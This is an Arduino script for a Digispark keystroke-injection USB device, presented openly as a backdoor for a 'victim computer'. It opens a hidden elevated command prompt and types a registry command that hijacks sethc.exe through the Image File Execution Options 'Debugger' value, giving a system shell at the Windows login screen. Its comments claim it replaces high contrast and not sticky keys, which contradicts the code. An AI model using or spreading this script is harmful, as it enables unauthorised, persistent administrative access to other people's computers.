//By 8figurealltimepro
// Simple backdoor - needs admin privilege 
// Run this script when the victim computer is turned on.Later you can spawn an admin cmd on the login screen by alt+shift+printscreen
// PS the script replaces high contrast feature with the cmd. Not the sticky keys because I have seen many people turn off sticky keys while gaming and so on.
// As always increase the delay if needed
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1"); //starting admin cmd
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); 
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 50; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.delay(500);    
  DigiKeyboard.print("reg add "); //sorry I was getting confused on how to correctly add the / symbols. you can convert it to a one-liner.
  DigiKeyboard.print("\"");
  DigiKeyboard.print("HKEY_LOCAL_MACHINE");
  DigiKeyboard.print("\\SOFTWARE");
  DigiKeyboard.print("\\Microsoft\\Windows NT\\CurrentVersion\\Image");
  DigiKeyboard.print(" File Execution Options\\sethc.exe");
  DigiKeyboard.print("\"");
  DigiKeyboard.print(" /v ");
  DigiKeyboard.print("\"");
  DigiKeyboard.print("Debugger");
  DigiKeyboard.print("\"");
  DigiKeyboard.print(" /t ");
  DigiKeyboard.print("REG_SZ ");
  DigiKeyboard.print("/d ");
  DigiKeyboard.print("\"");
  DigiKeyboard.print("C:\\windows\\system32\\cmd.exe");
  DigiKeyboard.print("\"");
  DigiKeyboard.print(" /f");// replace highcontrast to cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");//exit
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
